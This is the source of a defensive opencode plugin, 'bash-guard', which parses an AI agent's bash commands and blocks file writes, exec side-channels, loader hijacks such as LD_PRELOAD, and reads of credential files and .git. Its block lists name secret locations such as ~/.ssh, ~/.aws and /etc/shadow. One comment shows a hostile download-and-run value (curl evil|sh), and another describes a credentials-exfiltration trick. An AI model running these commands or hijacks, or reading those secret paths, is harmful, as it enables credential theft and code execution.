import type { Plugin } from "@opencode-ai/plugin"
import type { Node, Parser as ParserType } from "web-tree-sitter"
import os from "node:os"
import path from "node:path"
import fs from "node:fs"
import { createRequire } from "node:module"
import { fileURLToPath } from "node:url"

// bash-guard: a tool.execute.before backstop that hard-blocks (throws) bash
// commands containing write/exec/escape side-channels the glob permission model
// can't catch, plus secret-read blocking and .git blocking.
//
// It is DEFENSE-IN-DEPTH *behind* opencode's own permission model — it can only
// block-or-allow (not "ask"). So it focuses on dangerous behaviour that rides on
// commands opencode allow-lists silently (head/grep/rg/ug/sort/fd/awk/sed/find/…
// + redirects). Anything opencode already gates is deferred to opencode.
//
// Threat model: BALANCED. We catch over-eager write/exec/escape behaviour via
// structural (tree-sitter) detection. We do NOT try to defeat deliberate
// obfuscation (`e=echo; $e ...`, base64, `bash -c '...'`) — that is the sandbox's
// job. Fail-safe: if the parser fails to init we block ALL bash.
//
// READS are allowed by default (deferred to opencode); the guard only hard-blocks
// reads of credentials/secrets and anything under a .git directory.
//
// The thrown message reaches the model verbatim, so it explains why + what to do.

const require = createRequire(import.meta.url)

// ── constants ───────────────────────────────────────────────────────────────

const CWD_CMDS = new Set(["cd", "chdir", "pushd", "popd"])

// Wrappers we transparently strip to find the "effective" command.
const WRAPPERS = new Set([
  "env",
  "sudo",
  "time",
  "nohup",
  "command",
  "builtin",
  "exec",
  "stdbuf",
  "setsid",
  "nice",
  "ionice",
  "xargs",
  "timeout",
])

// Wrapper options that consume the NEXT token as a value (so its value isn't
// mistaken for the effective command, e.g. `sudo -u root sed -i` → real cmd sed).
const WRAPPER_VALUE_FLAGS: Record<string, Set<string>> = {
  sudo: new Set(["-u", "--user", "-g", "--group", "-p", "--prompt", "-C", "-h", "--host", "-r", "--role", "-t", "--type", "-U", "-D", "--chdir"]),
  env: new Set(["-u", "--unset", "-C", "--chdir"]),
  xargs: new Set(["-I", "--replace", "-n", "--max-args", "-L", "-l", "--max-lines", "-P", "--max-procs", "-s", "--max-chars", "-E", "--eof", "-d", "--delimiter", "-a", "--arg-file"]),
  nice: new Set(["-n", "--adjustment"]),
  ionice: new Set(["-c", "--class", "-n", "--classdata", "-p", "--pid"]),
  stdbuf: new Set(["-i", "--input", "-o", "--output", "-e", "--error"]),
  timeout: new Set(["-s", "--signal", "-k", "--kill-after"]),
}

// Commands whose positional args never read files — skip path scoping.
const ECHO_LIKE = new Set(["echo", "printf", "true", "false", ":", "print"])

// Commands whose FIRST positional is a pattern/program, not a file path.
const PATTERN_FIRST = new Set(["grep", "egrep", "fgrep", "rg", "ug", "ugrep", "sed", "awk", "gawk", "mawk", "jq", "jaq", "fd", "fdfind"])

// Commands taking a pattern/script from a -f/--file flag (so its value is a path).
const FILE_FLAG_CMDS = new Set(["grep", "egrep", "fgrep", "rg", "ug", "ugrep", "sed", "awk", "gawk", "mawk", "jq", "jaq"])

const GIT_CMDS = new Set(["git", "yadm"])

// Scope-isolating tree-sitter nodes: a `cd` inside these must NOT leak outward.
const SCOPE_ISOLATORS = new Set(["subshell", "command_substitution", "process_substitution"])

// Inline env vars that hijack an external program / inject code (exec side-channel).
const ENV_HIJACK = new Set([
  "PAGER", "GIT_PAGER", "GIT_EXTERNAL_DIFF", "GIT_SSH", "GIT_SSH_COMMAND", "GIT_PROXY_COMMAND",
  "GIT_ASKPASS", "SSH_ASKPASS", "EDITOR", "VISUAL", "LESSOPEN", "LESSCLOSE", "MANPAGER", "GIT_EDITOR",
  "BASH_ENV", "ENV", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "DYLD_LIBRARY_PATH",
  "PERL5OPT", "PERL5LIB", "RUBYOPT", "PYTHONSTARTUP", "NODE_OPTIONS",
  "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM", "GIT_CONFIG_COUNT",
])

// Editor env vars whose value git/$cmd would EXEC. They live in ENV_HIJACK, but a no-op value is the
// documented non-interactive workaround (git-write skill: `GIT_EDITOR=true git rebase --continue`).
// Allow ONLY these exact no-op values; any other value stays blocked.
// NOTE: GIT_SEQUENCE_EDITOR is deliberately NOT in ENV_HIJACK — `git rebase` is never allow-listed
// (always `ask`, human-gated) and the git-write skill relies on `GIT_SEQUENCE_EDITOR="sed -i …"` to
// edit the rebase plan. Accepted as ask-gated-only.
const EDITOR_VARS = new Set(["EDITOR", "VISUAL", "GIT_EDITOR"])
const NOOP_EDITORS = new Set(["true", ":", "/bin/true", "/usr/bin/true"])

const WRITE_REDIRECT_OPS = new Set([">", ">>", "&>", "&>>", ">|"])

// Directory names that mean "credentials live here" → block reads inside them.
const SECRET_SEGMENTS = new Set([".ssh", ".aws", ".gnupg", ".gpg", ".kube", ".docker", ".password-store", ".azure"])

// ── wasm resolution (robust, ends in fail-safe) ──────────────────────────────

function resolveWasm(spec: string): string | null {
  try {
    return require.resolve(spec)
  } catch {}
  try {
    return fileURLToPath((import.meta as unknown as { resolve: (s: string) => string }).resolve(spec))
  } catch {}
  const guess = path.join(os.homedir(), ".config", "opencode", "node_modules", spec)
  try {
    fs.accessSync(guess)
    return guess
  } catch {}
  return null
}

async function initParserOrNull(): Promise<ParserType | null> {
  try {
    const coreWasm = resolveWasm("web-tree-sitter/tree-sitter.wasm")
    const bashWasm = resolveWasm("tree-sitter-bash/tree-sitter-bash.wasm")
    if (!coreWasm || !bashWasm) return null
    const { Parser, Language } = await import("web-tree-sitter")
    await Parser.init({ locateFile: () => coreWasm })
    const parser = new Parser()
    parser.setLanguage(await Language.load(bashWasm))
    return parser
  } catch {
    return null
  }
}

// ── path helpers ─────────────────────────────────────────────────────────────

function unquote(text: string): string {
  if (text.length < 2) return text
  const first = text[0]
  const last = text[text.length - 1]
  if ((first === '"' || first === "'") && first === last) return text.slice(1, -1)
  return text
}

// Normalize a path token the way bash would *for matching purposes*: drop shell
// quotes and backslash-escapes so `~/".ssh"/id_rsa` and `/etc/s\hadow` can't dodge
// the secret/.git checks. (Over-normalizing single-quoted $VARs is fail-closed.)
function dequote(text: string): string {
  return text.replace(/\\(.)/g, "$1").replace(/['"]/g, "")
}

// Expand the safe, statically-knowable parts of a path: ~ and $HOME/$PWD/$TMPDIR.
function expandSafe(text: string, cwd: string): string {
  let out = dequote(text)
  if (out === "~") return os.homedir()
  out = out.replace(/^~(?=[/\\]|$)/, os.homedir())
  out = out
    .replace(/\$\{HOME\}/g, os.homedir())
    .replace(/\$HOME(?![A-Za-z0-9_])/g, os.homedir())
    .replace(/\$\{PWD\}/g, cwd)
    .replace(/\$PWD(?![A-Za-z0-9_])/g, cwd)
    .replace(/\$\{TMPDIR\}/g, process.env.TMPDIR ?? os.tmpdir())
    .replace(/\$TMPDIR(?![A-Za-z0-9_])/g, process.env.TMPDIR ?? os.tmpdir())
  return out
}

function isDynamic(text: string): boolean {
  return text.includes("$") || text.includes("`")
}

// realpath tolerant of non-existent leaf components (resolves symlinks + ..).
function resolveReal(abs: string): string {
  const resolved = path.resolve(abs)
  const tail: string[] = []
  let cur = resolved
  while (true) {
    try {
      return path.join(fs.realpathSync(cur), ...[...tail].reverse())
    } catch {
      const parent = path.dirname(cur)
      if (parent === cur) return resolved
      tail.push(path.basename(cur))
      cur = parent
    }
  }
}

function isInside(real: string, roots: string[]): boolean {
  return roots.some((r) => real === r || real.startsWith(r.endsWith(path.sep) ? r : r + path.sep))
}

// Standard "write to the terminal / an existing fd" targets — harmless, not files.
function isDevWrite(p: string): boolean {
  return p === "/dev/null" || p === "/dev/stdout" || p === "/dev/stderr" || p === "/dev/tty" || /^\/dev\/fd\/\d+$/.test(p)
}

function hasGitSegment(p: string): boolean {
  return p.split(/[/\\]/).includes(".git")
}

// Does this path look like a credential/secret we should never read via bash?
function isSecretPath(p: string): boolean {
  const segs = p.split(/[/\\]/).filter(Boolean)
  for (const s of segs) if (SECRET_SEGMENTS.has(s)) return true
  for (let i = 0; i + 1 < segs.length; i++) {
    if (segs[i] === ".config" && (segs[i + 1] === "gh" || segs[i + 1] === "gcloud")) return true
  }
  const base = segs[segs.length - 1] ?? ""
  if (/^\.(netrc|npmrc|pypirc|dockercfg|git-credentials|pgpass|boto)$/.test(base)) return true
  if (base === "auth.json" || base === "credentials.db") return true
  if (/^\.env(\..+)?$/.test(base) || /\.env$/.test(base)) return true
  if (/^id_(rsa|dsa|ecdsa|ed25519)$/.test(base)) return true
  if (/\.(pem|key|p12|pfx|keystore|jks)$/i.test(base)) return true
  if (/_history$/.test(base) || /^\.(zhistory|lesshst|history|mysql_history)$/.test(base)) return true
  if (/^(shadow|sudoers|gshadow|master\.passwd)$/.test(base) && p.includes("/etc/")) return true
  return false
}

function buildTmpAllow(): string[] {
  const out = new Set<string>()
  for (const p of [os.tmpdir(), path.join(os.tmpdir(), "opencode"), "/tmp/opencode"]) {
    try {
      out.add(fs.realpathSync(p))
    } catch {}
  }
  return [...out]
}

// ── tree-sitter helpers (tree-sitter-bash 0.25.0) ────────────────────────────

type Cmd = {
  name: string
  args: string[]
  env: { name: string; value: string }[]
}

function extract(command: Node): Cmd {
  const nameNode = command.childForFieldName("name")
  const name = nameNode ? nameNode.text : ""
  const args: string[] = []
  const env: { name: string; value: string }[] = []
  for (let i = 0; i < command.childCount; i++) {
    const child = command.child(i)
    if (!child) continue
    if (child.type === "variable_assignment") {
      const n = child.childForFieldName("name")
      const v = child.childForFieldName("value")
      env.push({ name: n ? n.text : "", value: v ? v.text : "" })
      continue
    }
    if (command.fieldNameForChild(i) === "argument") args.push(child.text)
  }
  return { name, args, env }
}

function namedChildren(node: Node): Node[] {
  const out: Node[] = []
  for (let i = 0; i < node.namedChildCount; i++) {
    const c = node.namedChild(i)
    if (c) out.push(c)
  }
  return out
}

// Direct `file_redirect` children of a node (a command's leading redirects, or a
// redirected_statement's trailing redirects — which also wrap pipelines/subshells).
function directFileRedirects(node: Node): Node[] {
  const out: Node[] = []
  for (let i = 0; i < node.childCount; i++) {
    const c = node.child(i)
    if (c && c.type === "file_redirect") out.push(c)
  }
  return out
}

function redirectInfo(r: Node): { op: string; dest: string } | null {
  let op = ""
  const dests: string[] = []
  for (let i = 0; i < r.childCount; i++) {
    const c = r.child(i)
    if (!c || c.type === "file_descriptor") continue
    if (r.fieldNameForChild(i) === "destination") {
      dests.push(c.text)
      continue
    }
    op = c.type
  }
  if (dests.length === 0) return null
  return { op, dest: dests.join("") }
}

// `env -S "cmd args"` carries the real command as a single string value.
function envSplitString(args: string[]): string | undefined {
  for (let i = 0; i < args.length; i++) {
    const a = args[i]
    if ((a === "-S" || a === "--split-string") && i + 1 < args.length) return unquote(args[i + 1])
    if (a.startsWith("-S") && a.length > 2) return unquote(a.slice(2))
    if (a.startsWith("--split-string=")) return unquote(a.slice("--split-string=".length))
  }
  return undefined
}

// Strip leading wrappers (env/sudo/xargs/timeout/...) + their option-values +
// "VAR=val" tokens + a bare duration/adjustment positional, to find the real command.
function effective(cmd: Cmd): { name: string; args: string[] } {
  let name = path.basename(cmd.name)
  let args = cmd.args
  while (WRAPPERS.has(name) && args.length > 0) {
    if (name === "env") {
      const s = envSplitString(args)
      if (s !== undefined) {
        const toks = s.trim().split(/\s+/).filter(Boolean)
        if (toks.length === 0) break
        name = path.basename(toks[0])
        args = toks.slice(1)
        continue
      }
    }
    const valueFlags = WRAPPER_VALUE_FLAGS[name]
    let i = 0
    while (i < args.length) {
      const a = args[i]
      if (/^[A-Za-z_]\w*=/.test(a)) {
        i++
        continue
      }
      if (a.startsWith("-")) {
        i += valueFlags?.has(a) && i + 1 < args.length ? 2 : 1
        continue
      }
      break
    }
    if (i < args.length) {
      if (name === "timeout" && /^[\d.]+[smhd]?$/.test(args[i])) i++
      else if (name === "nice" && /^-?\d+$/.test(args[i])) i++
    }
    if (i >= args.length) break
    name = path.basename(args[i])
    args = args.slice(i + 1)
  }
  return { name, args }
}

function hasPatternSourceFlag(args: string[]): boolean {
  return args.some((a) => /^(-e|-f|--regexp|--file|--expression|--from-file)(=|$)/.test(a))
}

// ── verdict ──────────────────────────────────────────────────────────────────

type Ctx = { cwd: string; tmpAllow: string[] }
type Verdict = { block: true; reason: string } | { block: false }
type Scope = { cwd: string | null }
type ScopeWrite = (raw: string, what: string) => Verdict
type ScopeRead = (raw: string, gitExempt: boolean) => Verdict

const ok: Verdict = { block: false }
const no = (reason: string): Verdict => ({ block: true, reason })

function inspect(parser: ParserType, command: string, ctx: Ctx): Verdict {
  let tree
  try {
    tree = parser.parse(command)
  } catch {
    return no("the command could not be parsed by bash-guard (treated as unsafe)")
  }
  if (!tree || !tree.rootNode) return no("bash-guard produced no parse tree (treated as unsafe)")
  if (tree.rootNode.hasError) return no("the command did not parse cleanly (possible unbalanced quoting/syntax)")

  // Reads: block only secrets + .git; everything else is deferred to opencode.
  const scopeReadIn = (raw: string, gitExempt: boolean, cwd: string | null): Verdict => {
    const base = cwd ?? ctx.cwd
    const expanded = expandSafe(raw, base)
    const check = (p: string): Verdict => {
      if (!gitExempt && hasGitSegment(p)) return no(`path "${raw}" points inside a .git directory (blocked)`)
      if (isSecretPath(p)) return no(`path "${raw}" looks like a credential/secret; reading it via bash is blocked`)
      return ok
    }
    for (const p of [expanded, path.resolve(base, expanded), resolveReal(path.resolve(base, expanded))]) {
      const v = check(p)
      if (v.block) return v
    }
    return ok
  }

  // Writes: must be /dev/null or under the resolved tmp allowlist.
  const scopeWriteIn = (raw: string, what: string, cwd: string | null): Verdict => {
    if (cwd === null) return no(`${what} target is relative to an unknown directory`)
    const expanded = expandSafe(raw, cwd)
    if (expanded.startsWith("~")) return no(`${what} target "${raw}" uses an unresolved ~user path`)
    if (isDynamic(expanded)) return no(`${what} target "${raw}" contains an unresolved variable/substitution`)
    if (isDevWrite(expanded)) return ok
    const real = resolveReal(path.resolve(cwd, expanded))
    if (isDevWrite(real)) return ok
    if (isInside(real, ctx.tmpAllow)) return ok
    return no(
      `${what} target "${raw}" (→ ${real}) writes outside the temp allowlist; use the Write/Edit tool instead, or write under $TMPDIR`,
    )
  }

  const processRedirect = (r: Node, cwd: string | null, gitExempt: boolean): Verdict => {
    const info = redirectInfo(r)
    if (!info) return ok
    const destText = dequote(info.dest)
    const isFd = /^\d+$/.test(destText) || destText === "-"
    if ((info.op === ">&" || info.op === "<&") && isFd) return ok
    if (WRITE_REDIRECT_OPS.has(info.op) || (info.op === ">&" && !isFd)) return scopeWriteIn(info.dest, "redirection (>)", cwd)
    if (info.op === "<") return scopeReadIn(info.dest, gitExempt, cwd)
    return ok
  }

  const handleCommand = (node: Node, scope: Scope): Verdict => {
    const cmd = extract(node)
    const eff = effective(cmd)
    const base = eff.name
    const gitExempt = GIT_CMDS.has(base)
    const consumed = new Set<number>()
    const sw: ScopeWrite = (raw, what) => scopeWriteIn(raw, what, scope.cwd)
    const sr: ScopeRead = (raw, ge) => scopeReadIn(raw, ge, scope.cwd)

    // Job 1a: inline env hijacks
    //  - Known exec/loader-hijack vars (PAGER, GIT_SSH_COMMAND, LD_PRELOAD, BASH_ENV, …) cause
    //    their value to be executed or loaded as code → block ANY value regardless of content.
    //  - For all other inline vars, only a command substitution is an independent threat
    //    (FOO=$(curl evil|sh) cmd). A plain path value (CBD_CFG=/x, KUBECONFIG=/y) is inert
    //    config: harmful only if cmd reads $FOO and writes somewhere — but real redirect targets
    //    are caught by Job 1b and real path args by Job 2.
    for (const e of cmd.env) {
      const envName = e.name.toUpperCase()
      if (ENV_HIJACK.has(envName)) {
        // A no-op editor (true/:) is the documented non-interactive git workaround; allow ONLY the
        // exact no-op value (after unquote+trim) and block every other value, which the var would exec.
        if (!(EDITOR_VARS.has(envName) && NOOP_EDITORS.has(unquote(e.value).trim())))
          return no(`inline environment override ${e.name}=... can hijack an external program or inject code`)
      }
      const val = unquote(e.value)
      if (val.includes("$(") || val.includes("`"))
        return no(`inline environment override ${e.name}=${e.value} embeds a command substitution`)
    }

    // Job 1b: the command's OWN direct redirects (leading `>out cmd`, `cmd 2>err`)
    for (const r of directFileRedirects(node)) {
      const v = processRedirect(r, scope.cwd, gitExempt)
      if (v.block) return v
    }

    // Job 1c: write/exec flags by command
    const fv = checkFlags(base, eff.args, consumed, sw, sr)
    if (fv.block) return fv

    // Job 2 + Job 3: secret/.git scoping for remaining positional paths
    if (!ECHO_LIKE.has(base)) {
      if (base === "find") {
        const FIND_GLOBALS = new Set(["-H", "-L", "-P"])
        for (let i = 0; i < eff.args.length; i++) {
          const a = eff.args[i]
          if (a === "-D") {
            i++
            continue
          }
          if (a.startsWith("-O")) continue
          if (FIND_GLOBALS.has(a)) continue
          if (a.startsWith("-")) break // first predicate → the rest is a match expression
          const v = sr(a, gitExempt)
          if (v.block) return v
        }
      } else {
        const patternFirst = PATTERN_FIRST.has(base) && !hasPatternSourceFlag(eff.args)
        let patternSkipped = false
        for (let i = 0; i < eff.args.length; i++) {
          if (consumed.has(i)) continue
          const a = eff.args[i]
          if (a.startsWith("-")) continue
          if (base === "chmod" && a.startsWith("+")) continue
          if (patternFirst && !patternSkipped) {
            patternSkipped = true
            continue
          }
          const v = sr(a, gitExempt)
          if (v.block) return v
        }
      }
    }

    // cd threading (mutates this scope's cwd)
    if (CWD_CMDS.has(base)) {
      const target = eff.args.find((a) => !a.startsWith("-"))
      if (target === undefined) scope.cwd = os.homedir()
      else if (target === "-") scope.cwd = null
      else {
        const expanded = expandSafe(target, scope.cwd ?? ctx.cwd)
        if (isDynamic(expanded) || expanded.startsWith("~") || scope.cwd === null) scope.cwd = null
        else scope.cwd = resolveReal(path.resolve(scope.cwd, expanded))
      }
    }

    return ok
  }

  // Recursive, scope-aware walk: a `cd` threads left-to-right within a scope but a
  // `cd` inside a subshell / command-substitution does NOT leak to the outer scope.
  const walk = (node: Node, scope: Scope): Verdict => {
    if (node.type === "redirected_statement") {
      for (const r of directFileRedirects(node)) {
        const v = processRedirect(r, scope.cwd, false)
        if (v.block) return v
      }
    }
    if (node.type === "command") {
      const v = handleCommand(node, scope)
      if (v.block) return v
    }
    for (const child of namedChildren(node)) {
      const childScope: Scope = SCOPE_ISOLATORS.has(child.type) ? { cwd: scope.cwd } : scope
      const v = walk(child, childScope)
      if (v.block) return v
    }
    return ok
  }

  return walk(tree.rootNode, { cwd: ctx.cwd })
}

// ── per-command write/exec flag checks ───────────────────────────────────────

function checkFlags(base: string, args: string[], consumed: Set<number>, sw: ScopeWrite, sr: ScopeRead): Verdict {
  const has = (...flags: string[]) => args.some((a) => flags.includes(a))

  // -f / --file=<path> pattern/script files (value is a real path → scope it).
  if (FILE_FLAG_CMDS.has(base)) {
    for (let i = 0; i < args.length; i++) {
      const a = args[i]
      let val: string | undefined
      if ((a === "-f" || a === "--file" || a === "--from-file") && i + 1 < args.length) val = args[i + 1]
      else if (a.startsWith("-f") && a.length > 2 && !a.startsWith("--")) val = a.slice(2)
      else if (a.startsWith("--file=")) val = a.slice("--file=".length)
      else if (a.startsWith("--from-file=")) val = a.slice("--from-file=".length)
      if (val !== undefined) {
        const v = sr(val, false)
        if (v.block) return v
      }
    }
  }

  switch (base) {
    case "sed": {
      for (const a of args) {
        if (a === "--in-place" || a.startsWith("--in-place=")) return no("`sed --in-place` edits files in place")
        if (!a.startsWith("--") && /^-[A-Za-z]*i/.test(a)) return no("`sed -i` edits files in place")
      }
      for (const prog of sedPrograms(args)) {
        const v = checkSedProgram(prog, sw, sr)
        if (v.block) return v
      }
      return ok
    }
    case "sort": {
      for (let i = 0; i < args.length; i++) {
        const a = args[i]
        if (a === "-o" || a === "--output") {
          if (i + 1 < args.length) {
            consumed.add(i + 1)
            const v = sw(args[i + 1], "`sort -o`")
            if (v.block) return v
          }
        } else if (a.startsWith("--output=")) {
          const v = sw(a.slice("--output=".length), "`sort --output`")
          if (v.block) return v
        } else if (a.startsWith("-o") && a.length > 2) {
          const v = sw(a.slice(2), "`sort -o`")
          if (v.block) return v
        }
      }
      return ok
    }
    case "tee": {
      for (let i = 0; i < args.length; i++) {
        const a = args[i]
        if (a.startsWith("-")) continue
        consumed.add(i)
        const v = sw(a, "`tee`")
        if (v.block) return v
      }
      return ok
    }
    case "tree": {
      for (let i = 0; i < args.length; i++) {
        const a = args[i]
        if ((a === "-o" || a === "--output") && i + 1 < args.length) {
          consumed.add(i + 1)
          const v = sw(args[i + 1], "`tree -o`")
          if (v.block) return v
        } else if (a.startsWith("-o") && a.length > 2 && !a.startsWith("--")) {
          const v = sw(a.slice(2), "`tree -o`")
          if (v.block) return v
        } else if (a.startsWith("--output=")) {
          const v = sw(a.slice("--output=".length), "`tree --output`")
          if (v.block) return v
        }
      }
      return ok
    }
    case "uniq": {
      const UNIQ_VALUE = new Set(["-f", "--skip-fields", "-s", "--skip-chars", "-w", "--check-chars"])
      const positions: number[] = []
      for (let i = 0; i < args.length; i++) {
        const a = args[i]
        if (UNIQ_VALUE.has(a)) {
          i++
          continue
        }
        if (a.startsWith("-")) continue
        positions.push(i)
      }
      if (positions.length >= 2) {
        consumed.add(positions[1])
        const v = sw(args[positions[1]], "`uniq` output file")
        if (v.block) return v
      }
      return ok
    }
    case "dd": {
      for (let i = 0; i < args.length; i++) {
        const a = args[i]
        if (a.startsWith("of=")) {
          consumed.add(i)
          const v = sw(a.slice(3), "`dd of=`")
          if (v.block) return v
        } else if (a.startsWith("if=")) {
          consumed.add(i)
          const v = sr(a.slice(3), false)
          if (v.block) return v
        }
      }
      return ok
    }
    case "fd":
    case "fdfind": {
      if (has("-x", "-X", "--exec", "--exec-batch")) return no("`fd --exec/-x/-X` runs an arbitrary command per file")
      return ok
    }
    case "find": {
      if (has("-exec", "-execdir", "-delete", "-fprintf", "-fprint", "-fprint0", "-fls", "-ok", "-okdir"))
        return no("`find -exec/-execdir/-delete/-ok/-fls` runs, deletes, or writes — use Read/Glob or fd without -x")
      return ok
    }
    case "rg": {
      if (has("--hostname-bin")) return no("`rg --hostname-bin` runs an external command")
      if (args.some((a) => a === "--pre" || a.startsWith("--pre=") || a === "--pre-glob" || a.startsWith("--pre-glob=")))
        return no("`rg --pre` runs an external preprocessor command per file (RCE)")
      return ok
    }
    case "ug":
    case "ugrep": {
      if (args.some((a) => a === "--filter" || a.startsWith("--filter=")))
        return no("`ug --filter` runs an external command per file (RCE)")
      for (const a of args) {
        if (a === "--save-config") {
          const v = sw("./.ugrep", "`ug --save-config`")
          if (v.block) return v
        } else if (a.startsWith("--save-config=")) {
          const v = sw(a.slice("--save-config=".length), "`ug --save-config`")
          if (v.block) return v
        }
      }
      return ok
    }
    case "awk":
    case "gawk":
    case "mawk": {
      if (args.some((a) => a === "-i" || a === "--inplace" || a === "inplace" || a === "-iinplace"))
        return no("`gawk -i inplace` edits files in place")
      for (const prog of awkPrograms(args)) {
        const v = checkAwkProgram(prog, sw, sr)
        if (v.block) return v
      }
      return ok
    }
    case "git":
    case "yadm": {
      // Effective subcommand = first token that isn't a global option (or an option's value token).
      const GIT_GLOBAL_VAL = new Set(["-C", "--git-dir", "--work-tree", "--namespace", "-c", "--super-prefix", "--exec-path"])
      let sub = ""
      let subIdx = -1
      for (let i = 0; i < args.length; i++) {
        const a = args[i]
        if (!a.startsWith("-")) {
          sub = a
          subIdx = i
          break
        }
        if (GIT_GLOBAL_VAL.has(a)) i++ // option takes a separate value token → skip it
      }
      for (let i = 0; i < args.length; i++) {
        const a = args[i]
        if (a === "--output") {
          if (i + 1 < args.length) {
            consumed.add(i + 1)
            const v = sw(args[i + 1], "`git --output`")
            if (v.block) return v
          }
        } else if (a.startsWith("--output=")) {
          const v = sw(a.slice("--output=".length), "`git --output`")
          if (v.block) return v
        } else if (a === "-c" && i + 1 < args.length) {
          const cfg = args[i + 1]
          if (
            /^(core\.(pager|sshcommand|editor|fsmonitor|hookspath|askpass)|sequence\.editor|diff\.external|.*\.(pager|cmd|driver|process|helper))/i.test(cfg) ||
            cfg.includes("=!")
          )
            return no("`git -c` overrides a pager/exec/hook config (exec side-channel) — see the git-read/git-write skill for the supported approach")
        } else if (sub === "config" && i > subIdx) {
          // `git config -f/--file <path>` reads an arbitrary file as INI; git is exempt from path
          // scoping elsewhere, and the `--file=`/`-f<path>` attached forms start with "-" so the
          // positional read-scan skips them — secret-scope them here (else `git config --list
          // --file=~/.aws/credentials` silently exfiltrates). ONLY for `config`: other subcommands'
          // `-f` means --force (branch/tag/checkout), not a file.
          if ((a === "-f" || a === "--file") && i + 1 < args.length) {
            const v = sr(args[i + 1], false)
            if (v.block) return v
          } else if (a.startsWith("--file=")) {
            const v = sr(a.slice("--file=".length), false)
            if (v.block) return v
          } else if (a.startsWith("-f") && a.length > 2 && !a.startsWith("--")) {
            const v = sr(a.slice(2), false)
            if (v.block) return v
          }
        }
      }
      return ok
    }
    default:
      return ok
  }
}

// Collect inline sed program strings (the first positional script + any -e values).
function sedPrograms(args: string[]): string[] {
  const progs: string[] = []
  let scriptTaken = false
  for (let i = 0; i < args.length; i++) {
    const a = args[i]
    if ((a === "-e" || a === "--expression") && i + 1 < args.length) {
      progs.push(unquote(args[i + 1]))
      i++
      continue
    }
    if (a.startsWith("-e") && a.length > 2 && !a.startsWith("--")) {
      progs.push(unquote(a.slice(2)))
      continue
    }
    if ((a === "-f" || a === "--file") && i + 1 < args.length) {
      i++
      continue
    }
    if (a.startsWith("-")) continue
    if (!scriptTaken) {
      progs.push(unquote(a))
      scriptTaken = true
    }
  }
  return progs
}

// Best-effort scan of a sed program for `w`/`W`/`r`/`R` file commands + `s///w`.
function checkSedProgram(prog: string, sw: ScopeWrite, sr: ScopeRead): Verdict {
  for (const seg of prog.split(/[;\n]/)) {
    const m = seg
      .trim()
      .match(/^(?:[0-9]+|\$|\/(?:\\.|[^/])*\/[IM]*)?(?:,(?:[0-9]+|\$|\/(?:\\.|[^/])*\/[IM]*))?\s*!?\s*([wWrR])\s+(\S[^\n]*)$/)
    if (m) {
      const target = m[2].trim()
      const v = m[1] === "w" || m[1] === "W" ? sw(target, "`sed w` writes to a file") : sr(target, false)
      if (v.block) return v
    }
  }
  const sm = prog.match(/\bs(.)(?:\\.|(?!\1)[^])*?\1(?:\\.|(?!\1)[^])*?\1[gpiIem0-9]*w[ \t]+(\S[^\n;]*)/)
  if (sm) {
    const v = sw(sm[2].trim(), "`sed s///w` writes to a file")
    if (v.block) return v
  }
  return ok
}

// Collect inline awk program strings (first positional + any -e/--source values).
function awkPrograms(args: string[]): string[] {
  const progs: string[] = []
  let scriptTaken = false
  for (let i = 0; i < args.length; i++) {
    const a = args[i]
    if ((a === "-e" || a === "--source") && i + 1 < args.length) {
      progs.push(unquote(args[i + 1]))
      i++
      continue
    }
    if ((a === "-f" || a === "--file" || a === "-v" || a === "--assign") && i + 1 < args.length) {
      i++
      continue
    }
    if (a.startsWith("-")) continue
    if (!scriptTaken) {
      progs.push(unquote(a))
      scriptTaken = true
    }
  }
  return progs
}

// Best-effort scan of an awk program for exec/redirect/getline side-channels.
function checkAwkProgram(prog: string, sw: ScopeWrite, sr: ScopeRead): Verdict {
  if (/\bsystem\s*\(/.test(prog)) return no("`awk` program calls system() (RCE)")
  if (/\|\s*&?\s*getline\b/.test(prog)) return no("`awk` program pipes a command into getline (RCE)")
  if (/\bprintf?\b[^;{}\n]*\|/.test(prog)) return no("`awk` program pipes output to a command (RCE)")
  for (const m of prog.matchAll(/\bprintf?\b[^;{}\n]*?>>?\s*("([^"]+)"|'([^']+)'|([~/][^\s;)]*))/g)) {
    const target = m[2] ?? m[3] ?? m[4]
    if (target) {
      const v = sw(target, "`awk` print redirect")
      if (v.block) return v
    }
  }
  for (const m of prog.matchAll(/getline\b[^<;{}\n]*<\s*("([^"]+)"|'([^']+)'|([~/][^\s;)]*))/g)) {
    const target = m[2] ?? m[3] ?? m[4]
    if (target) {
      const v = sr(target, false)
      if (v.block) return v
    }
  }
  return ok
}

// ── plugin ───────────────────────────────────────────────────────────────────

export default (async ({ directory }) => {
  const tmpAllow = buildTmpAllow()
  const parser = await initParserOrNull() // null => fail-safe block-all in the hook
  if (!parser)
    console.error(
      "[bash-guard] tree-sitter failed to initialize — ALL bash is blocked until deps are fixed (bun install in ~/.config/opencode) and opencode is restarted",
    )
  else if (process.env.OPENCODE_BASHGUARD_DEBUG) console.error("[bash-guard] initialized")

  return {
    "tool.execute.before": async (input, output) => {
      if (input.tool !== "bash") return
      const args = (output?.args ?? {}) as { command?: string; workdir?: string }
      const command = args.command ?? ""
      if (!command.trim()) return
      if (!parser)
        throw new Error(
          "bash-guard failed to initialize (tree-sitter wasm could not be loaded) — bash is blocked until the deps are fixed and opencode is restarted. Run `bun install` in ~/.config/opencode.",
        )
      const cwd = args.workdir ? path.resolve(directory, args.workdir) : directory
      if (process.env.OPENCODE_BASHGUARD_DEBUG)
        console.error("[bash-guard] before: cwd=" + cwd + " cmd=" + JSON.stringify(command).slice(0, 200))
      const verdict = inspect(parser, command, { cwd, tmpAllow })
      if (verdict.block)
        throw new Error(
          `bash-guard blocked this command: ${verdict.reason}. If this is genuinely needed, ask the user to run it themselves or approve it explicitly.`,
        )
    },
  }
}) satisfies Plugin

// Named exports for the test suite (tests/bash-guard.test.ts). These are inert for
// plugin loading — opencode's loader only ever uses the default export.
export { inspect, initParserOrNull, buildTmpAllow, isSecretPath }
